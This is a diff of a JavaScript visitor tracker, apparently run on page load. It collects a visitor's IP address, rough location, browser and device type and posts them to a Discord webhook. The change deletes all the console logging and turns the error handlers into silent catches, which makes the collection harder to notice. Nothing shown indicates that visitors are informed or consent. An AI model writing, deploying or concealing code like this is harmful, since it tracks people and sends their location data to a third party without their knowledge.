@@ -24,12 +24,6 @@ function sendWebhookMessage(ip, browser, device, location) {
         },
         body: JSON.stringify(message),
     })
-        .then(() => {
-            console.log('Уведомление успешно отправлено в Discord');
-        })
-        .catch((error) => {
-            console.error('Ошибка при отправке уведомления в Discord:', error);
-        });
 }
 
 function getDeviceType(userAgent) {
@@ -62,11 +56,10 @@ fetch('https://api.ipify.org?format=json')
                 const location = `${locationData.country}, ${locationData.city}`;
                 sendWebhookMessage(ip, browser, device, location);
             })
-            .catch((error) => {
-                console.error('Ошибка при получении местоположения:', error);
+            .catch(() => {
                 sendWebhookMessage(ip, browser, device, 'Unknown');
             });
     })
-    .catch((error) => {
-        console.error('Ошибка при получении IP-адреса:', error);
+    .catch(() => {
+
     });
